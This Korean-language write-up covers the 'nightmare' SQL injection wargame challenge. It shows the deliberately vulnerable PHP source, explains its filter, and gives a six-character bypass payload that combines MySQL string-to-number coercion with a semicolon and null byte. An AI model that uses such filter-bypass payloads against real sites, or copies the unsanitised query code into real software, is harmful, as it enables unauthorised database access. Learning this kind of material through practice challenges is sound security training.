# NIGHTMARE

## Problem
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

## Inspection
* `if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~");`
	- 파라미터의 `pw`에서 `prob`, `_`, `.`, `()`, `#`, `-`를 거른다.
* `if(strlen($_GET[pw])>6) exit("No Hack ~_~");`
	- 파라미터의 `pw`의 길이가 6글자 이상이면 걸러진다.
* `select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'`
	- 파라미터로 `pw`를 받는다.
	- `pw`를 `()`와 `'`로 감싼다.
	- `id!='admin'`이 있다. 하지만 문제를 푸는데는 상관없다.
* `if($result['id']) solve("nightmare");`
	- 쿼리문의 결과가 뜬다면 통과한다.

## Solution
* 주석 대신 쿼리문의 끝을 나타내는 `;`과, MySQL의 자동형변환을 이용한다.
	- `?pw='=9);%00`
	- `select id from prob_nightmare where pw=(''=9);') and id!='admin'`
	- `''=9`
		+ `0`을 제외한 아무 숫자나 넣으면 `false(0)`이 뜬다.
	- `pw=(''=9)`
		+ 문자열을 숫자와 비교할 때 `0`으로 계산한다.
		+ 따라서 `pw=0`은 `0=0`으로 참이다.
	- `;%00`
		+ 주석 대신 세미콜론과 널 값으로 뒷내용을 무시할 수 있다.
	
## Review
* [mysql: why comparing a 'string' to 0 gives true](https://stackoverflow.com/questions/22080382/mysql-why-comparing-a-string-to-0-gives-true)
* 위 글을 보고 `?pw=1'='0`으로 날려 앞부분은 참을 만들었는데, 통과를 못했다. 뒷부분이 항상 거짓인 것 같아서 이를 무시하려고 해봤으나, 주석을 제외한 나머지 방법을 찾지 못했다. 그래서 솔루션을 찾아보았다..